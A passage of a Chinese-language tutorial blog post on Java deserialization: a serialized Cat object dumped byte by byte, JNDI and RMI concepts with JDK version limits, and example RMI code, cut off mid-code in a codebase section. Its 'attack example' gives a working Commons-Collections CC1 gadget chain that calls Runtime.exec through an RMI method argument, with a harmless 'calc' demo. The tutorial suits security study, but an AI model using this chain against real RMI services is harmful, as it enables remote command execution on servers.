class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cat</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>(<span class="string">&quot;south&quot;</span>, <span class="number">7</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;out.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file));</span><br><span class="line">        oos.writeObject(cat);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">newCat</span> <span class="operator">=</span> (Cat) ois.readObject();</span><br><span class="line">        System.out.println(newCat.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Cat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        stream.defaultWriteObject();</span><br><span class="line">        stream.writeObject(<span class="string">&quot;miao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> (String) stream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>文件转 <strong>16</strong> 进制字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -e <span class="string">&#x27;16/1 &quot;%02x&quot;&#x27;</span> out.txt</span><br></pre></td></tr></table></figure>
+<p>然后 <strong>SerializationDumper</strong> 看看结构。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">java -jar SerializationDumper-v1<span class="number">.13</span>.jar <span class="string">&quot;aced000573720003436174232d6ccbfabb15200300024900036167654c00046e616d657400124c6a6176612f6c616e672f537472696e673b787000000007740005736f7574687400046d69616f78&quot;</span></span><br><span class="line"><span class="comment">// 开头两行是幻数</span></span><br><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line"><span class="comment">// 然后是内容 会有多个contents嵌套</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">  		<span class="comment">// 类名的长度和值</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">        Value - Cat - <span class="number">0x436174</span></span><br><span class="line">  		<span class="comment">// 生成的serialVersionUID</span></span><br><span class="line">      serialVersionUID - <span class="number">0x23</span> <span class="number">2d</span> 6c cb fa bb <span class="number">15</span> <span class="number">20</span></span><br><span class="line">  		<span class="comment">// 句柄值，类似于对象的ID</span></span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  		<span class="comment">// 为0x02时表示实现了Serializable接口，0x03表示还额外实现了writeObject方法</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">  		<span class="comment">// 成员变量个数及类型、名称长度与值</span></span><br><span class="line">      fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">            Value - age - <span class="number">0x616765</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Object - L - <span class="number">0x4c</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - <span class="number">0x74</span></span><br><span class="line">              newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">              Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">              Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">      <span class="comment">// 这部分由annotateClass方法写入，默认是TC_ENDBLOCKDATA</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">    <span class="comment">// 成员变量所赋的值</span></span><br><span class="line">    classdata</span><br><span class="line">      Cat</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">age</span></span><br><span class="line">            <span class="params">(<span class="type">int</span>)</span><span class="number">7</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">07</span></span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">                Length - <span class="number">5</span> - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">                Value - south - <span class="number">0x736f757468</span></span><br><span class="line">        <span class="comment">// 实现了writeObject方法后出现的字段，内容为写入的内容的属性值</span></span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - miao - <span class="number">0x6d69616f</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>
+<p>此处可以看见 <strong>writeObject</strong> 写入的数据在
+<strong>objectAnnotation</strong> 字段的位置。</p>
+<h2 id="待完善hashmap相关">待完善【HashMap相关——</h2>
+<h1 id="jdni">JDNI</h1>
+<p>全称为 <strong>Java Naming and Directory
+Interface</strong>，规定了统一的通用的服务标准，是
+<strong>J2EE/JakartaEE</strong> 中的重要规范之一。</p>
+<p>命名服务将名称和对象进行关联，提供通过名称找到对象的操作。</p>
+<p>目录服务是命名服务的扩展，除了提供名称和对象的关联，还允许对象具有属性，提供创建、添加、删除目录对象以及修改目录对象属性等操作。</p>
+<p>支持远程方法调用【<strong>RMI</strong>】，公共对象请求代理体系结构【<strong>CORBA</strong>】，轻型目录访问协议【<strong>LDAP</strong>】或域名服务【<strong>DNS</strong>】。</p>
+<p>常见的两种分别是基于 <strong>RMI</strong> 和
+<strong>LDAP</strong>。</p>
+<ul>
+<li>基于 <strong>LDAP</strong> 的利用方式：适用 <strong>JDK</strong>
+版本：<strong>11.0.1/8u191/7u201/6u211 </strong>之前。
+<ul>
+<li><strong>8u191</strong> 更新中，对 <strong>LDAP</strong>
+向量做了限制，并发布了
+<strong>CVE-2018-3149</strong>，关闭了远程类加载。</li>
+</ul></li>
+<li>基于 <strong>RMI</strong> 的利用方式：适用 <strong>JDK</strong>
+版本：<strong>6u132/7u122/8u113</strong> 之前。
+<ul>
+<li><strong>8u122</strong> 中加了反序列化白名单的机制，关闭了
+<strong>RMI</strong> 远程加载代码。</li>
+</ul></li>
+</ul>
+<h2 id="rmi">RMI</h2>
+<p>全称为<strong>Remote Method
+Invocation</strong>，是<strong>Java</strong>的远程方法调用，由<strong>Registry/Server/Client</strong>三部分组成。</p>
+<h3 id="代理模式">代理模式</h3>
+<figure>
+<img src="/images/Study-Unserialize-Java/1.png" alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<ol type="1">
+<li><strong>Server</strong>创建远程对象后向<strong>Registry</strong>注册。</li>
+<li><strong>Client</strong>访问<strong>Registry</strong>并查找远程对象。</li>
+<li><strong>Registry</strong>返回<strong>Stub</strong>。</li>
+<li><strong>Client</strong>调用<strong>Stub</strong>与<strong>Skeleton</strong>通信。</li>
+<li><strong>Skeleton</strong>代理调用服务后返回结果给<strong>Stub</strong>。</li>
+<li><strong>Stub</strong>把结果返回给<strong>Client</strong>。</li>
+</ol>
+<blockquote>
+<p>其中，<strong>Stub</strong>为<strong>Client</strong>的代理，<strong>Skeleton</strong>为<strong>Server</strong>的代理。</p>
+</blockquote>
+<p>代理模式中<strong>Server</strong>和<strong>Client</strong>皆有执行远程对象的方法，故可互相反序列化攻击。</p>
+<h3 id="工厂模式">工厂模式</h3>
+<figure>
+<img src="/images/Study-Unserialize-Java/3.gif" alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<ol type="1">
+<li><strong>Server</strong>创建<strong>Factory</strong>和<strong>Product</strong>，注册<strong>Reference</strong>关联两者。</li>
+<li><strong>Server</strong>向<strong>Registry</strong>注册<strong>Factory</strong>。</li>
+<li><strong>Client</strong>访问<strong>Registry</strong>并查找远程对象。</li>
+<li><strong>Registry</strong>返回指向<strong>Factory</strong>的<strong>Reference</strong>。</li>
+<li><strong>Client</strong>加载<strong>Factory</strong>，得到指向<strong>Product</strong>的<strong>Reference</strong>。</li>
+<li><strong>Client</strong>加载<strong>Product</strong>。</li>
+</ol>
+<p>工厂模式中执行远程对象的方法的是<strong>Client</strong>，故是攻击<strong>Client</strong>的方式，是常说的<strong>JNDI</strong>注入。</p>
+<p>安全问题在于可以对<a
+target="_blank" rel="noopener" href="https://github.com/NickstaDB/BaRMIe"><strong>RMI</strong>的方法进行探测</a>与<strong>Codebase</strong>的可控加载。</p>
+<h3 id="正常服务实例">正常服务实例</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">  </span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Naming.rebind(<span class="string">&quot;creature&quot;</span>, <span class="keyword">new</span> <span class="title class_">CatImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            System.out.println(c.say());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>C/S</strong>结构。</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">Client</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RMIClient</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CreatureInterface</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Sever</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">RMIServer</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CreatureInterface</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">CatImpl</span></span><br></pre></td></tr></table></figure>
+<p>因为接口的使用，客户端并不需要知道<strong>CatImpl</strong>的具体实现。</p>
+<p>此处将<strong>Registry</strong>和<strong>Server</strong>一同实现了。</p>
+<h3 id="攻击实例">攻击实例</h3>
+<p>先借用一下<strong>CC1</strong>链子的实例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            System.out.println(c.eat(getPayload(<span class="string">&quot;calc&quot;</span>)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="codebase提一嘴">Codebase提一嘴</h3>
+<p><strong>RMI</strong>支持动态类加载，如果有设置<strong>java.rmi.server.codebase</strong>，则在本地<strong>classpath</strong>找不到类的时候会去<strong>codebase</strong>的地址继续寻找并尝试加载。</p>
+<h4 id="攻击条件">攻击条件</h4>
+<ol type="1">
+<li>安装配置了<strong>SecurityManager</strong></li>
+<li><strong>Java</strong>版本低于<strong>7u21</strong>、<strong>6u45</strong>，或者设置<strong>java.rmi.server.useCodebaseOnly=false</strong></li>
+</ol>
+<h4 id="示例">示例</h4>
+<h5 id="server">Server</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title 